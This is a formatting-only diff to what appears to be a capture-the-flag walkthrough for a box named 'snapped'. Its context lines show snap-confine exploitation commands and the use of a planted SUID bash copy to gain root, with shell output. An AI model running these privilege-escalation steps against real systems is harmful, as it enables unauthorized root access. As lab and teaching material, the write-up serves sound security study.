@@ -629,6 +629,7 @@ After the loop stops, run the exploit.
 ```bash
 jonathan@snapped:/proc/2741/cwd$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash
 Running as unit: snap.d1774450042.scope; invocation ID: 6ace7fafd375402cb710099628380897
+
 jonathan@snapped:/proc/2741/cwd$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
 cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_YruWdH//dev: No such file or directory
 ```
@@ -731,7 +732,8 @@ Exit from this environment, use that SUID binary we set to become root.
 
 ```bash
 jonathan@snapped:~$ ls -la /var/snap/firefox/common/bash
--rwsr-xr-x 1 root jonathan 1396520 Mar 24 2:10 /var/snap/firefox/common/bash                                                                           
+-rwsr-xr-x 1 root jonathan 1396520 Mar 24 2:10 /var/snap/firefox/common/bash
+
 jonathan@snapped:~$ /var/snap/firefox/common/bash -p
 bash-5.1# id
 uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
